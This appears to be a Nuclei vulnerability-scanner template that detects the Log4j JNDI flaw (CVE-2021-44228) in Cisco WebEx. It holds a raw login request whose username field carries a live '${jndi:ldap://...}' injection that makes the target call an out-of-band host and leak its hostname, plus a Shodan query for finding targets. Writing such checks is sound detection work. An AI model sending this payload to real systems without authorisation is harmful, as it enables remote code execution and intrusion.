http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /orion/login?siteurl=meet HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Referer: {{RootURL}}/orion/login?siteurl=meet&rnd=0.1359184728177283

    X-Requested-With: XMLHttpRequest

    Content-Type: application/x-www-form-urlencoded


    type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&bAjax=true

    '
id: cisco-webex-log4j-rce
info:
  author: shaikhyaser
  classification:
    cpe: cpe:2.3:a:cisco:webex_meetings_online:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'Cisco WebEx is susceptible to Log4j JNDI remote code execution. Cisco
    WebEx provides web conferencing, videoconferencing and contact center as a service
    applications.

    '
  metadata:
    max-request: 1
    product: webex_meetings_online
    shodan-query: title:"Cisco WebEx"
    vendor: cisco
  name: Cisco WebEx - Remote Code Execution (Apache Log4j)
  reference:
  - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,cisco,webex,oast,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
  str: '{{rand_base(5)}}'
